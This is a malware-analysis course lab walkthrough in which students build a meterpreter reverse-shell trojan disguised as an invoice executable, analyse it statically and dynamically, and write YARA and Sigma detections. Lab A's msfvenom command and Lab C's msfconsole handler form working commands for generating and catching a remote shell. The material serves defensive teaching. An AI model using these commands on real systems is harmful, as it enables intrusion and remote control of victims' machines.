---
session: 7
title: Malware Threats & Analysis — Guided Lab Walkthrough
---

# Session 7 — Guided Lab Walkthrough

> Isolated lab network only. Lab A builds working malware — never email/upload it; delete at session end.

## Lab A — Craft a controlled trojan (Kali)
```bash
mkdir -p /tmp/lab
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -f exe -o /tmp/lab/invoice_2026.exe
sha256sum /tmp/lab/invoice_2026.exe     # record: this is your sample's identity + ground truth
```
Ground truth to check your analysis against: payload = meterpreter reverse_tcp, C2 = 192.168.56.101:443, format = PE exe.

## Lab B — Static analysis (no execution)
```bash
# identity + reputation
sha256sum /tmp/lab/invoice_2026.exe          # paste hash into VirusTotal (search, don't upload)
# strings
strings -n 8 /tmp/lab/invoice_2026.exe | grep -Ei '[0-9]{1,3}(\.[0-9]{1,3}){3}|http|ws2_|ssl'
# PE imports (capability)
python3 -c "import pefile;pe=pefile.PE('/tmp/lab/invoice_2026.exe');[print(e.dll.decode()) for e in pe.DIRECTORY_ENTRY_IMPORT]"
```
Expect `ws2_32.dll` (sockets → network capability). Record IOCs: hash, C2, capability.

## Lab C — Dynamic analysis (detonate in the chamber)
Checklist first: snapshot taken, host-only network, `ping -c1 8.8.8.8` FAILS, monitor armed, handler staged.
```bash
# attacker/listener (Kali):
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.101; set LPORT 443; run"
# monitor (analysis host): watch -n1 'ss -tnp'      (Windows: TCPView.exe)
# detonate in the isolated VM:  .\invoice_2026.exe
# observe:  invoice_2026.exe -> 192.168.56.101:443 ESTABLISHED   (C2 confirmed)
```
Record behavioural IOCs (process, connection, any Run-key write). Revert the snapshot.

## Lab D — Write the detections
YARA (file):
```
rule Session7_Lab_Trojan {
  strings:
    $mz = { 4D 5A }
    $ws = "ws2_32.dll" ascii nocase
    $c2 = "192.168.56.101" ascii
  condition: $mz at 0 and $ws and $c2
}
```
```bash
yara Session7_Lab.yar /tmp/lab/invoice_2026.exe   # MATCH
yara Session7_Lab.yar /usr/bin/                    # NO match (well-scoped)
```
Sigma (behaviour): outbound 80/443 from an Image under `C:\Users\` / `Temp` / `ProgramData` (Sysmon Event ID 3). Map both to `attack.t1071.001`.

## Lab E — Incident triage report
Fill `exercises/session-07/incident_triage_template.md`: verdict, behaviour + ATT&CK, IOCs by durability, detections (attach YARA+Sigma), containment, hardening.
